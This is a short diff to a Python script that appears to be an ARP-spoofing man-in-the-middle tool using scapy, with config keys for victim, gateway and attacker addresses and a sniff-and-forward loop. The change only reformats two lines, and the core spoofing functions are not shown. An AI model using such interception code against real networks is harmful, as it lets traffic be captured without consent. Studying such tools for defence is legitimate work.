@@ -89,7 +89,9 @@ def load_config():
     config = configparser.ConfigParser()
     config.read(CONFIG_PATH)
     
-    expected_keys = {'victim_mac', 'victim_ip', 'gateway_mac', 'gateway_ip', 'attacker_mac', 'interface', 'scapy_path'}
+    expected_keys = {
+        'victim_mac', 'victim_ip', 'gateway_mac', 'gateway_ip', 'attacker_mac', 'interface', 'scapy_path'
+    }
     config_keys = set(config['DEFAULT'].keys())
     if config_keys != expected_keys:
         raise ValueError("config.ini contains unexpected parameters")
@@ -180,7 +182,9 @@ def main():
     spoof_thread = threading.Thread(target=spoof, args=(victim_mac, victim_ip, gateway_mac, gateway_ip))
     spoof_thread.start()
 
-    sniff(iface=interface, prn=lambda pkt: forward_pkt(pkt, src_dst, attacker_mac, gateway_mac, s), filter="ether src %s or ether src %s" % (victim_mac, gateway_mac))
+    sniff(iface=interface, 
+          prn=lambda pkt: forward_pkt(pkt, src_dst, attacker_mac, gateway_mac, s),
+          filter="ether src %s or ether src %s" % (victim_mac, gateway_mac))
 
 
 if __name__ == '__main__':
